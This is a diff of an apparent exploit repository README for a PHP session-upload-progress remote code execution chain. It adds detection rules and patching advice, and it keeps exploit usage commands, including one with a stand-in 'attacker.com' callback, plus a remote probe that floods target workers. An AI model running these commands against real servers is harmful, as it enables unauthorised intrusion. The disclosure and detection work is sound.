@@ -4,8 +4,7 @@
 
 Two critical vulnerabilities in PHP's session upload progress handler allow unauthenticated remote code execution against stock Apache + mod_php deployments. No application-level vulnerability (LFI, file upload, deserialization) is required -- just a reachable `index.php`.
 
-I take no credit for creation of the pocs. Just thought they would be good to have in one place.
-Also, nice to join this AI exploitation creation bandwagon hahahaha
+I take no credit for creation of the PoCs. Just thought they would be good to have in one place, along with detection and remediation guidance.
 
 | | |
 |---|---|
@@ -16,6 +15,133 @@ Also, nice to join this AI exploitation creation bandwagon hahahaha
 | **Affected** | PHP 8.2 < 8.2.35, 8.3 < 8.3.36, 8.4 < 8.4.27, 8.5 < 8.5.12 |
 | **Fixed in** | PHP 8.2.35, 8.3.36, 8.4.27, 8.5.12 |
 | **Vector** | Network / No authentication / No user interaction |
+
+## Am I affected?
+
+If you run **any** of these PHP versions behind Apache with `mod_php` (the prefork MPM), you are vulnerable. No special application code is needed -- the default `index.php` is enough.
+
+| Branch | Vulnerable | Fixed |
+|---|---|---|
+| PHP 8.2 | 8.2.0 -- 8.2.34 | 8.2.35 |
+| PHP 8.3 | 8.3.0 -- 8.3.35 | 8.3.36 |
+| PHP 8.4 | 8.4.0 -- 8.4.26 | 8.4.27 |
+| PHP 8.5 | 8.5.0 -- 8.5.11 | 8.5.12 |
+
+PHP 8.1 and below are EOL and do not receive patches. If your environment runs these versions, assume vulnerable.
+
+**Quick check:**
+
+```bash
+# From the outside:
+curl -sI http://your-server/ | grep -E 'X-Powered-By|Server'
+
+# On the server itself:
+php -v | head -1
+apachectl -V | grep MPM
+```
+
+If `X-Powered-By` shows a version in the vulnerable range and the MPM is `prefork`, patch immediately.
+
+## What to do right now
+
+1. **Patch immediately** -- upgrade to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12+
+2. **If patching is delayed:**
+   - Disable `session.upload_progress.enabled` in `php.ini` (set to `0`) -- this is the fastest mitigation and breaks nothing unless your application shows upload progress bars
+   - Deploy WAF rules blocking `PHP_SESSION_UPLOAD_PROGRESS` in request bodies
+   - Rate-limit concurrent POST connections per source IP
+   - Monitor Apache error logs for OOM and segfault patterns (see [Detection](#how-to-detect-exploitation) below)
+3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique)
+
+## How to detect exploitation
+
+If someone has already attempted this against your server, here is what to look for.
+
+### In your Apache error log
+
+The most obvious indicator is repeated out-of-memory errors followed by segfaults:
+
+```
+[error] Allowed memory size of 134217728 bytes exhausted
+[notice] child pid 12345 exit signal Segmentation fault (11)
+```
+
+If you see both of these in close succession, especially multiple times, investigate immediately.
+
+### Other signs on the server
+
+- Session files (`sess_*`) larger than 1MB in `/tmp` (or your `session.save_path`)
+- Session files containing binary / non-printable data
+- Shell processes (`sh`, `bash`, `dash`) spawned as children of `apache2` / `httpd`
+- Unexpected files in `/tmp` or the webroot written by `www-data`
+
+### In network traffic
+
+- A burst of 149+ concurrent POST requests from a single IP to a single endpoint
+- `Transfer-Encoding: chunked` POST requests with no `Content-Length` header
+- Multipart bodies containing `PHP_SESSION_UPLOAD_PROGRESS`
+- `Set-Cookie: PHPSESSID=` headers larger than 100KB (this is the heap leak -- a normal session cookie is ~60 bytes)
+
+### Sigma rule
+
+```yaml
+title: php2shell Session Upload Progress RCE Attempt
+id: b7c4d8e0-1234-5678-9abc-def012345678
+status: experimental
+description: Detects exploitation of CVE-2026-109618/CVE-2026-109619 via session upload progress handler
+references:
+    - https://github.com/9bie/php2shell-bypass-aslr-exp
+logsource:
+    category: webserver
+    product: apache
+detection:
+    selection_oom:
+        cs-status: 500
+        sc-bytes|gt: 100000
+    selection_error_log:
+        EventData|contains:
+            - 'Allowed memory size of'
+            - 'bytes exhausted'
+    selection_session:
+        cs-body|contains: 'PHP_SESSION_UPLOAD_PROGRESS'
+    selection_chunked:
+        cs-header-transfer-encoding: 'chunked'
+        cs-method: 'POST'
+    condition: (selection_oom and selection_session) or
+               (selection_error_log and selection_session) or
+               (selection_chunked and selection_session and selection_oom)
+    timeframe: 5m
+    count: 10
+falsepositives:
+    - Legitimate large file uploads with session progress tracking (rare to trigger OOM)
+level: high
+tags:
+    - attack.initial_access
+    - attack.t1190
+    - cve.2026.109618
+    - cve.2026.109619
+```
+
+### Suricata rules
+
+```
+alert http any any -> $HOME_NET any (msg:"php2shell - PHP_SESSION_UPLOAD_PROGRESS with chunked TE";
+    flow:to_server,established;
+    content:"POST"; http_method;
+    content:"PHP_SESSION_UPLOAD_PROGRESS"; http_client_body;
+    content:"Transfer-Encoding|3a 20|chunked"; http_header;
+    threshold:type both, track by_src, count 50, seconds 30;
+    classtype:web-application-attack;
+    sid:2026100; rev:1;)
+
+alert http $HOME_NET any -> any any (msg:"php2shell - Oversized Set-Cookie PHPSESSID (heap leak)";
+    flow:to_client,established;
+    content:"Set-Cookie|3a 20|PHPSESSID="; http_header;
+    isdataat:100000,relative;
+    classtype:web-application-attack;
+    sid:2026101; rev:1;)
+```
+
+---
 
 ## How it works
 
@@ -110,6 +236,50 @@ python3 phpexploit.py http://target.example.com/ "id" -i
 python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker.com/
 ```
 
+## Remote diagnostic (diag_remote.py)
+
+A target-agnostic diagnostic tool for probing remote servers **without needing shell access or error logs**. It answers the questions that the Apache error log would normally answer: is this prefork? how many workers? does A1 trigger OOM? does the worker survive?
+
+This is useful when you can reach the target over HTTP but cannot read its logs — run it from your own machine before attempting the full exploit to understand what the target will do.
+
+```bash
+# Probe a remote target
+python3 diag_remote.py --host 192.168.155.10 --port 80
+
+# Probe a local Docker lab
+python3 diag_remote.py --host 127.0.0.1 --port 18110
+
+# Increase probe range for high-capacity servers
+python3 diag_remote.py --host 10.0.0.5 --port 80 --max-probe 500
+```
+
+**What it checks (5 steps):**
+
+| Step | What it does | What it tells you |
+|---|---|---|
+| 1 | Reads `Server` and `X-Powered-By` headers | Confirms Apache + PHP version |
+| 2 | Holds open incremental POST connections until no worker can serve a GET | Confirms prefork MPM and estimates `MaxRequestWorkers` (use this value for `--workers`) |
+| 3 | Releases holders until a worker is free, verifies it responds | Confirms worker pinning works on this target |
+| 4 | Fires the A1 OOM payload (same as the real exploit) | Checks if the server returns 500 (= OOM triggered) |
+| 5 | Sends a session-triggering POST to the same worker | **Key result:** did the worker survive A1? |
+
+**Interpreting step 5:**
+
+| Result | Meaning | Action |
+|---|---|---|
+| Worker alive + Set-Cookie present | Worker survived OOM — exploit should work | Run `phppoc2.py` against this target |
+| Worker alive + oversized Set-Cookie (>10KB) | Stale pointer confirmed — B1 leak will read heap | Exploit is very likely to succeed |
+| Worker NOT responding | Worker crashed (segfault, not OOM bailout) | B1 will always get 0 bytes — the stale pointer is lost. The target's PHP build may handle OOM differently (e.g., `SIGKILL` from cgroup limits, or a stricter allocator). Check if the target has additional memory constraints beyond `memory_limit` |
+| Cannot saturate workers | Server is not prefork, or `MaxRequestWorkers` > `--max-probe` | Increase `--max-probe`, or confirm the target uses prefork MPM |
+
+**Options:**
+
+| Flag | Default | Description |
+|---|---|---|
+| `--host` | *(required)* | Target host |
+| `--port` | 80 | Target port |
+| `--max-probe` | 300 | Maximum holder connections to try |
+
 ## Lab setup
 
 The tested one-command path is `pure/run_pure.sh` (present in this repo). It launches the official `php:8.4.26-apache` image with stock production defaults, mounts `pure/docker/www` as the webroot and `./out` for proof files, and prints the config it verified:
@@ -187,7 +357,7 @@ curl -sI http://target/ | grep X-Powered-By
 curl -s http://target/info.php | grep -oP 'PHP Version \K[0-9.]+'
 ```
 
-Confirm the version is vulnerable (see [Affected versions](#affected-versions)). If it's patched, the exploit won't work.
+Confirm the version is vulnerable (see [Am I affected?](#am-i-affected)). If it's patched, the exploit won't work.
 
 ### Step 2: Get the matching Docker image
 
@@ -327,105 +497,23 @@ If the exploit fails, note which stage it stops at:
 
 **Different minor version** (e.g., 8.3.x vs 8.4.x) — the heap geometry may differ. If B1 (leak) succeeds but B2 (RCE) consistently fails with `candidate failed`, the `S` heap offset (`S = cand + 0xF8398`) and/or `delta_min`/`delta_max` need recalibration for that version's allocator behavior. This requires heap analysis with gdb — the calibration kit is vendored in this repo under `pure/` (`RESEARCH_PURE_128M.md` documents the 128M research path; `*.gdb` scripts such as `force_b.gdb`, `state.gdb`, `slots4.gdb` instrument the heap; `mk_b_min.py` / `mk_flood.py` build the probe bodies; `repro_pure.sh` reproduces the diagnostic runs). The upstream repo (`9bie/php2shell-bypass-aslr-exp`) has the full research history and evidence logs.
 
-## Affected versions
+## Known limitations
 
-| Branch | Vulnerable | Fixed |
-|---|---|---|
-| PHP 8.2 | 8.2.0 -- 8.2.34 | 8.2.35 |
-| PHP 8.3 | 8.3.0 -- 8.3.35 | 8.3.36 |
-| PHP 8.4 | 8.4.0 -- 8.4.26 | 8.4.27 |
-| PHP 8.5 | 8.5.0 -- 8.5.11 | 8.5.12 |
+- **Single-binary calibration.** Out of the box the exploit works against `php:8.4.26-apache` (Debian trixie build) only. Other builds need offset extraction (see [Multi-version support](#multi-version-support)); other *minor* versions additionally need heap-geometry recalibration.
+- **Apache mod_php + prefork only.** The worker-pinning stage assumes the prefork process model. PHP-FPM / event MPM targets need a different approach.
+- **`--proof` is read on the runner's machine.** With a remote `--host`, either share the `/out` volume or use an out-of-band `--cmd` (e.g. a callback request) instead of the default `id>/out/p1`.
+- **`run_pure.sh --dbg`** expects a debug image (`php2shell-dbg:gdb`) built from upstream's `src/` — the PHP source tarball is not vendored here.
+- **`phpexploit.py` needs an inclusion vector** (LFI / logs / FastCGI / PEAR). It is not the CVE chain; `phppoc2.py` is.
+- **Docker Desktop / WSL2 is not a viable lab environment.** The exploit's heap geometry constants were calibrated on native Linux Docker. WSL2's Microsoft custom kernel places the heap above `libphp.so` in the address space (native Linux places it below), which inverts the delta used to calculate `zif_system`. Use native Linux Docker (bare metal, a real VM, or a cloud instance) for lab testing.
 
-PHP 8.1 and below are EOL and do not receive patches. If your environment runs these versions, assume vulnerable.
+## Verifying the repo works
 
-## Detection
+Run `./selftest.sh` after cloning — it compiles every Python file, verifies the `pwn_pure.py` alias resolves, checks that every helper `phppoc2.py` and `run_pure.sh` reference actually exists, and (with `--docker`, if Docker is available) boots the lab target and fires one exploit attempt end-to-end.
 
-### Indicators of Compromise
+## Requirements
 
-**Network layer:**
-- Burst of 149+ concurrent POST requests from a single source to a single endpoint
-- `Transfer-Encoding: chunked` with no `Content-Length` header on POST requests
-- Multipart bodies containing `PHP_SESSION_UPLOAD_PROGRESS` field
-- `Set-Cookie: PHPSESSID=` response headers > 100KB (heap leak)
-- Abnormally large HTTP response bodies on simple endpoints
-
-**Host layer:**
-- Apache error log: `Allowed memory size of 134217728 bytes exhausted`
-- Apache error log: `child pid XXXXX exit signal Segmentation fault (11)`
-- Session files (`sess_*`) > 1MB in `session.save_path` (`/tmp` by default)
-- Session files containing binary / non-printable data
-- Shell processes (`sh`, `bash`, `dash`) spawned as children of `apache2` / `httpd`
-- Unexpected files in `/tmp` or webroot written by `www-data`
-
-### Sigma rule (generic)
-
-```yaml
-title: php2shell Session Upload Progress RCE Attempt
-id: b7c4d8e0-1234-5678-9abc-def012345678
-status: experimental
-description: Detects exploitation of CVE-2026-109618/CVE-2026-109619 via session upload progress handler
-references:
-    - https://github.com/9bie/php2shell-bypass-aslr-exp
-logsource:
-    category: webserver
-    product: apache
-detection:
-    selection_oom:
-        cs-status: 500
-        sc-bytes|gt: 100000
-    selection_error_log:
-        EventData|contains:
-            - 'Allowed memory size of'
-            - 'bytes exhausted'
-    selection_session:
-        cs-body|contains: 'PHP_SESSION_UPLOAD_PROGRESS'
-    selection_chunked:
-        cs-header-transfer-encoding: 'chunked'
-        cs-method: 'POST'
-    condition: (selection_oom and selection_session) or
-               (selection_error_log and selection_session) or
-               (selection_chunked and selection_session and selection_oom)
-    timeframe: 5m
-    count: 10
-falsepositives:
-    - Legitimate large file uploads with session progress tracking (rare to trigger OOM)
-level: high
-tags:
-    - attack.initial_access
-    - attack.t1190
-    - cve.2026.109618
-    - cve.2026.109619
-```
-
-### Suricata (network)
-
-```
-alert http any any -> $HOME_NET any (msg:"php2shell - PHP_SESSION_UPLOAD_PROGRESS with chunked TE";
-    flow:to_server,established;
-    content:"POST"; http_method;
-    content:"PHP_SESSION_UPLOAD_PROGRESS"; http_client_body;
-    content:"Transfer-Encoding|3a 20|chunked"; http_header;
-    threshold:type both, track by_src, count 50, seconds 30;
-    classtype:web-application-attack;
-    sid:2026100; rev:1;)
-
-alert http $HOME_NET any -> any any (msg:"php2shell - Oversized Set-Cookie PHPSESSID (heap leak)";
-    flow:to_client,established;
-    content:"Set-Cookie|3a 20|PHPSESSID="; http_header;
-    isdataat:100000,relative;
-    classtype:web-application-attack;
-    sid:2026101; rev:1;)
-```
-
-## Remediation
-
-1. **Patch immediately** -- upgrade to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12+
-2. **If patching is delayed:**
-   - Disable `session.upload_progress.enabled` in `php.ini` (set to `0`)
-   - Deploy WAF rules blocking `PHP_SESSION_UPLOAD_PROGRESS` in request bodies
-   - Rate-limit concurrent POST connections per source IP
-   - Monitor Apache error logs for OOM and segfault patterns
-3. **Long-term:** consider migrating from mod_php + prefork to PHP-FPM + event MPM (different process model, not vulnerable to this specific worker-pinning technique)
+- Python 3.8+ (standard library only — no third-party packages required)
+- Docker (for lab setup only)
 
 ## Repository layout & provenance
 
@@ -448,68 +536,6 @@ Local divergence from upstream (kept minimal and deliberate):
 - `phpexploit.py` `try_log_poison()`: fixed unescaped shell metacharacters in the `system()` payload (upstream bug)
 - `pure/decode_cookie.py`, `pure/repro_pure.sh`: widened pointer-range filter to cover both x86_64 and aarch64
 - `pure/watch_md.sh`: added guard for missing `run_a1_probe.sh` dependency
-
-## Remote diagnostic (diag_remote.py)
-
-A target-agnostic diagnostic tool for probing remote servers **without needing shell access or error logs**. It answers the questions that the Apache error log would normally answer: is this prefork? how many workers? does A1 trigger OOM? does the worker survive?
-
-This is useful when you can reach the target over HTTP but cannot read its logs — run it from your own machine before attempting the full exploit to understand what the target will do.
-
-```bash
-# Probe a remote target
-python3 diag_remote.py --host 192.168.155.10 --port 80
-
-# Probe a local Docker lab
-python3 diag_remote.py --host 127.0.0.1 --port 18110
-
-# Increase probe range for high-capacity servers
-python3 diag_remote.py --host 10.0.0.5 --port 80 --max-probe 500
-```
-
-**What it checks (5 steps):**
-
-| Step | What it does | What it tells you |
-|---|---|---|
-| 1 | Reads `Server` and `X-Powered-By` headers | Confirms Apache + PHP version |
-| 2 | Holds open incremental POST connections until no worker can serve a GET | Confirms prefork MPM and estimates `MaxRequestWorkers` (use this value for `--workers`) |
-| 3 | Releases holders until a worker is free, verifies it responds | Confirms worker pinning works on this target |
-| 4 | Fires the A1 OOM payload (same as the real exploit) | Checks if the server returns 500 (= OOM triggered) |
-| 5 | Sends a session-triggering POST to the same worker | **Key result:** did the worker survive A1? |
-
-**Interpreting step 5:**
-
-| Result | Meaning | Action |
-|---|---|---|
-| Worker alive + Set-Cookie present | Worker survived OOM — exploit should work | Run `phppoc2.py` against this target |
-| Worker alive + oversized Set-Cookie (>10KB) | Stale pointer confirmed — B1 leak will read heap | Exploit is very likely to succeed |
-| Worker NOT responding | Worker crashed (segfault, not OOM bailout) | B1 will always get 0 bytes — the stale pointer is lost. The target's PHP build may handle OOM differently (e.g., `SIGKILL` from cgroup limits, or a stricter allocator). Check if the target has additional memory constraints beyond `memory_limit` |
-| Cannot saturate workers | Server is not prefork, or `MaxRequestWorkers` > `--max-probe` | Increase `--max-probe`, or confirm the target uses prefork MPM |
-
-**Options:**
-
-| Flag | Default | Description |
-|---|---|---|
-| `--host` | *(required)* | Target host |
-| `--port` | 80 | Target port |
-| `--max-probe` | 300 | Maximum holder connections to try |
-
-## Known limitations
-
-- **Single-binary calibration.** Out of the box the exploit works against `php:8.4.26-apache` (Debian trixie build) only. Other builds need offset extraction (see [Multi-version support](#multi-version-support)); other *minor* versions additionally need heap-geometry recalibration.
-- **Apache mod_php + prefork only.** The worker-pinning stage assumes the prefork process model. PHP-FPM / event MPM targets need a different approach.
-- **`--proof` is read on the runner's machine.** With a remote `--host`, either share the `/out` volume or use an out-of-band `--cmd` (e.g. a callback request) instead of the default `id>/out/p1`.
-- **`run_pure.sh --dbg`** expects a debug image (`php2shell-dbg:gdb`) built from upstream's `src/` — the PHP source tarball is not vendored here.
-- **`phpexploit.py` needs an inclusion vector** (LFI / logs / FastCGI / PEAR). It is not the CVE chain; `phppoc2.py` is.
-- **Docker Desktop / WSL2 is not a viable lab environment.** The exploit's heap geometry constants were calibrated on native Linux Docker. WSL2's Microsoft custom kernel places the heap above `libphp.so` in the address space (native Linux places it below), which inverts the delta used to calculate `zif_system`. Use native Linux Docker (bare metal, a real VM, or a cloud instance) for lab testing.
-
-## Verifying the repo works
-
-Run `./selftest.sh` after cloning — it compiles every Python file, verifies the `pwn_pure.py` alias resolves, checks that every helper `phppoc2.py` and `run_pure.sh` reference actually exists, and (with `--docker`, if Docker is available) boots the lab target and fires one exploit attempt end-to-end.
-
-## Requirements
-
-- Python 3.8+ (standard library only — no third-party packages required)
-- Docker (for lab setup only)
 
 ## Credits
 
